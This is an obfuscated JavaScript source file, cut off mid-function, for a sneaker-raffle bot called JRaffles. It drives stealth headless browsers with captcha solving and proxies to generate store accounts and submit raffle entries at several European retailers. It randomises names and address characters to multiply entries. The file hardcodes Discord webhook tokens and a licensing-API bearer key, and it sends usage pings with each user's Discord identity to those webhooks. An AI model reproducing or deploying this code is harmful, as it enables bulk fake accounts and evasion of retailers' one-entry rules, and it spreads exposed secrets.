const { EmbedBuilder: _0x51aacf } = require('discord.js');
var _0x5c374d = require('exe');
const { execFile: _0x510144 } = require('child_process'), _0x479f93 = require('puppeteer-extra'), _0x50d2df = require('puppeteer-extra-plugin-recaptcha'), _0x16b6ec = require('puppeteer-extra-plugin-stealth'), _0x3b3689 = require('chalk'), _0x1dc4b6 = require('node-bash-title'), _0x7af797 = require('fs'), _0x131d7 = require('axios'), _0x4c0639 = require('papaparse');
var _0x4fc551 = require('random-name');
const _0x11451f = require('request');
var _0x55f1ed = require('prompt');
const _0x7dd18d = _0x11451f['jar']();
var _0xff80bf = {};
const _0x146897 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x5e61f9 = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x1a5031 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0xbb0cff = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x4be286 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x38912c = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x2bb371 = 'https://discord.com/api/webhooks/', _0x9ef43 = '' + _0x2bb371 + _0x1a5031, _0x18784f = '' + _0x2bb371 + _0xbb0cff, _0x478ec4 = '' + _0x2bb371 + _0x146897, _0x132dc8 = '' + _0x2bb371 + _0x5e61f9, _0x19d1c2 = '' + _0x2bb371 + _0x4be286, _0x157a45 = '' + _0x2bb371 + _0x38912c;
const _0x7fa362 = JSON['parse'](_0x7af797['readFileSync']('../package.json', 'utf-8')), _0x49c529 = _0x7fa362['version'];
var _0x1198e4, _0x4ec7b9, _0x45e898, _0x4469a2, _0x2fab11, _0x33e5e0, _0x446b97, _0x4450a8;
const _0x2b8752 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x13bd28 = ![];
const _0x475c22 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0xfb32a4 = '0123456789';
var _0x422ff8 = _0x475c22['split']('');
const _0x5c0d8f = require('auto-git-update'), { PageEmittedEvents: _0x38903e } = require('puppeteer'), { getRandomValues: _0x167861 } = require('crypto'), { resolve: _0x25d6d8 } = require('path'), { Console: _0x4685d6 } = require('console'), _0xbd67cc = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x589be8 = new _0x5c0d8f(_0xbd67cc);
async function _0x5852b5() {
    _0x2fab11 = _0x7af797['readdirSync']('../proxies'), _0x4469a2 = _0x7af797['readdirSync']('../tasks'), _0xff80bf = JSON['parse'](_0x7af797['readFileSync']('../settings.json', 'utf-8')), !_0xff80bf['delay'] && (_0xff80bf['delay'] = 0x2710, _0x7af797['writeFileSync']('../settings.json', JSON['stringify'](_0xff80bf))), !_0xff80bf['captchaKey'] && (_0xff80bf['captchaKey'] = '', _0x7af797['writeFileSync']('../settings.json', JSON['stringify'](_0xff80bf))), !_0xff80bf['useRandomProxy'] && (_0xff80bf['useRandomProxy'] = !![], _0x7af797['writeFileSync']('../settings.json', JSON['stringify'](_0xff80bf))), !_0xff80bf['webhook'] && (_0xff80bf['webhook'] = '', _0x7af797['writeFileSync']('../settings.json', JSON['stringify'](_0xff80bf))), _0xff80bf['MahaDelay'] = _0xff80bf['delay'], _0x2bb371 = _0xff80bf['webhook'], _0x33e5e0 = _0xff80bf['licenseKey'];
}
let _0x2139c1, _0x5e9464 = [], _0x2f5a44;
const _0x4a79d2 = _0x553f76 => new Promise(_0x3eb896 => setTimeout(_0x3eb896, _0x553f76));
function _0x578d31(_0x5d92f1, _0x2368ac) {
    return Math['floor'](Math['random']() * (_0x2368ac - _0x5d92f1 + 0x1) + _0x5d92f1);
}
async function _0x25c88b(_0x1cfde4) {
    return _0x131d7['get']('https://api.hyper.co/v4/licenses/' + _0x1cfde4, { 'headers': { 'Authorization': 'Bearer\x20' + _0x2b8752 } })['then'](_0x15342b => _0x15342b['data'])['catch'](() => null);
}
;
async function _0x156232(_0x1618b6) {
    console['clear']();
    if (_0x1618b6 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x556b47 = await _0x55f1ed['get']('License');
        if (_0x556b47['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x4a79d2(0xbb8), _0x156232(_0x1618b6);
        _0x1618b6 = _0x556b47['License'], _0xff80bf['licenseKey'] = _0x1618b6, _0x33e5e0 = _0x1618b6, _0x7af797['writeFileSync']('../settings.json', JSON['stringify'](_0xff80bf));
    }
    console['log']('Checking\x20license\x20' + _0x33e5e0 + '...'), await _0x4a79d2(0x320);
    const _0x310633 = await _0x25c88b(_0x1618b6);
    _0x446b97 = JSON['stringify'](_0x310633['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x4450a8 = JSON['stringify'](_0x310633['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x310633)
        return console['log']('License\x20not\x20found');
    if (!_0x310633['user'])
        return console['log']('License\x20not\x20bound');
    return _0x310633['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x13bd28 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x13bd28 = ![]);
}
async function _0x16ec6e() {
    var _0x3bbb09 = await _0x55f1ed['get']('Module');
    return console['clear'](), _0x3bbb09['Module'];
}
;
async function _0x5803ee() {
    var _0xfabc1f = await _0x55f1ed['get']('Setting');
    return console['clear'](), _0xfabc1f['Setting'];
}
async function _0x107b61() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x10d4d7 = 0x0; _0x10d4d7 < _0x4469a2['length']; _0x10d4d7++) {
        console['log']('\x20(' + _0x10d4d7 + ')\x20' + _0x4469a2[_0x10d4d7]);
    }
    console['log']('');
    var _0x6452db = await _0x55f1ed['get']('Task');
    if (_0x6452db['Task'] > _0x4469a2['length'] - 0x1 || isNaN(_0x6452db['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x4a79d2(0x3e8), _0x107b61();
    var _0x47e20e = _0x7af797['readFileSync']('../tasks/' + _0x4469a2[_0x6452db['Task']], 'utf-8');
    return _0x45e898 = _0x4c0639['parse'](_0x47e20e, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x3b3689['blue'](_0x4469a2[_0x6452db['Task']])), _0x1198e4 = _0x4469a2[_0x6452db['Task']], _0x45e898;
}
async function _0x47ea1e() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x21be54 = 0x0; _0x21be54 < _0x2fab11['length']; _0x21be54++) {
        console['log']('\x20(' + _0x21be54 + ')\x20' + _0x2fab11[_0x21be54]);
    }
    console['log']('');
    var _0x1498a7 = await _0x55f1ed['get']('Proxies');
    if (_0x1498a7['Proxies'] > _0x2fab11['length'] - 0x1 || isNaN(_0x1498a7['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x4a79d2(0x3e8), _0x47ea1e();
    var _0x5f1e69 = _0x7af797['readFileSync']('../proxies/' + _0x2fab11[_0x1498a7['Proxies']], 'utf-8')['split']('\x0a');
    let _0x459082 = _0x5f1e69['map']((_0x29dc99, _0x491e2d) => {
        sanatizeProxy = _0x29dc99['replace']('\x0d', '');
        if (_0x5f1e69[_0x491e2d + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x4ec7b9 = _0x2fab11[_0x1498a7['Proxies']], console['clear'](), _0x459082;
}
async function _0x490da6() {
    var _0x343a45 = await _0x55f1ed['get']('Value');
    return console['clear'](), _0x343a45['Value'];
}
async function _0x6bf5fb(_0x1c5c20) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x5c90f7 = 0x0; _0x5c90f7 < _0x1c5c20['length']; _0x5c90f7++) {
        console['log']('\x20(' + _0x5c90f7 + ')\x20[' + _0x1c5c20[_0x5c90f7]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x241c7c = await _0x55f1ed['get']('Module');
    return _0x241c7c['Module'];
}
async function _0x9f998c() {
    var _0x57379f = await _0x55f1ed['get']('Password');
    return console['clear'](), _0x57379f['Password'];
}
;
async function _0x52fae4() {
    var _0x5d80fe = await _0x55f1ed['get']('Links');
    return _0x5d80fe['Links'];
}
;
async function _0x1806f5() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x1cbdc7 = 0x0; _0x1cbdc7 < _0x5e9464['length']; _0x1cbdc7++) {
        console['log']('\x20(' + _0x1cbdc7 + ')\x20' + _0x5e9464[_0x1cbdc7]);
    }
    ;
    console['log']();
    let _0x4b7b62 = await _0x55f1ed['get']('Product');
    return console['clear'](), _0x4b7b62['Product'];
}
;
function _0x49028e() {
    var _0x4c1f70 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x4c1f70;
}
;
const _0x1adfd5 = [
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png'
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png'
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png'
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'VFB8Tq',
                            'custom_source': 'Air\x20Jordan\x204\x20Seafoam',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'RW67e2',
                                '$consent_form_version': 0x7d2f63,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'WdVw7N',
                            'custom_source': 'DV3742-021',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'S8GH2D',
                                '$consent_form_version': 0x7d9216,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x2110d2(_0x599e37, _0x2a4217) {
    let _0x200c70 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x49c529 != 'devkey') {
        await _0x131d7['post'](_0x599e37, _0x2a4217, _0x200c70);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x2df3ee(_0x38c2fe, _0x27b874, _0xa8fb4, _0x28b5b4, _0x42b47b) {
    if (!_0x28b5b4 && _0xa8fb4 == 'dev') {
        var _0x2b3db2 = new _0x51aacf()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x27b874['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x27b874['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x38c2fe['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0xff80bf['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x446b97,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x38c2fe['Url'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x49c529,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x2b3db2['data'];
    } else {
        if (_0x28b5b4 && _0xa8fb4 == 'dev') {
            var _0x2b3db2 = new _0x51aacf()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x27b874['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x446b97,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x27b874['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x38c2fe['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0xff80bf['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x42b47b,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x38c2fe['Url']
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x49c529,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x2b3db2['data'];
        } else {
            if (_0xa8fb4 == 'pub') {
                var _0x2b3db2 = new _0x51aacf()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x27b874['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x27b874['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x38c2fe['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0xff80bf['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x38c2fe['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x49c529,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x2b3db2['data'];
            } else {
                if (_0xa8fb4 == 'acc') {
                    var _0x2b3db2 = new _0x51aacf()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x27b874['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x446b97,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x27b874['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0xff80bf['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x49c529,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x2b3db2['data'];
                } else {
                    if (_0xa8fb4 == 'open') {
                        var _0x2b3db2 = new _0x51aacf()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x4450a8)['addFields']({
                            'name': 'User',
                            'value': '' + _0x446b97,
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x49c529,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x2b3db2['data'];
                    } else {
                        if (!_0x28b5b4 && _0xa8fb4 == 'ver') {
                            var _0x2b3db2 = new _0x51aacf()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x27b874['logo'])['addFields']({
                                'name': 'User',
                                'value': '' + _0x446b97,
                                'inline': !![]
                            }, {
                                'name': 'Store',
                                'value': '' + _0x27b874['store'],
                                'inline': !![]
                            }, {
                                'name': 'Delay',
                                'value': '' + _0xff80bf['delay'],
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x49c529,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x2b3db2['data'];
                        } else {
                            if (_0x28b5b4 && _0xa8fb4 == 'ver') {
                                var _0x2b3db2 = new _0x51aacf()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x27b874['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x446b97,
                                    'inline': !![]
                                }, {
                                    'name': 'Error',
                                    'value': '' + _0x42b47b,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x27b874['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0xff80bf['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x49c529,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x2b3db2['data'];
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x58b1b9(_0x13ff97, _0x52855d) {
    var _0x1fb101 = _0x13ff97[_0x52855d]['Address1']['split'](''), _0x36bf09 = _0x13ff97[_0x52855d]['Address2']['split'](''), _0x1e1197 = _0x13ff97[_0x52855d]['Email']['split']('@');
    for (var _0x471371 = 0x0; _0x471371 < _0x1fb101['length']; _0x471371++) {
        if (_0x1fb101[_0x471371] == 'X') {
            var _0x131045 = Math['round'](Math['random']() * (_0x475c22['length'] - 0x1));
            _0x1fb101[_0x471371] = _0x422ff8[_0x131045];
        }
    }
    ;
    for (var _0x471371 = 0x0; _0x471371 < _0x36bf09['length']; _0x471371++) {
        if (_0x36bf09[_0x471371] == 'X') {
            var _0x131045 = Math['round'](Math['random']() * (_0x475c22['length'] - 0x1));
            _0x36bf09[_0x471371] = _0x422ff8[_0x131045];
        }
    }
    ;
    _0x13ff97[_0x52855d]['FirstName'] == 'RANDOM' && (_0x13ff97[_0x52855d]['FirstName'] = _0x4fc551['first']());
    _0x13ff97[_0x52855d]['LastName'] == 'RANDOM' && (_0x13ff97[_0x52855d]['LastName'] = _0x4fc551['last']());
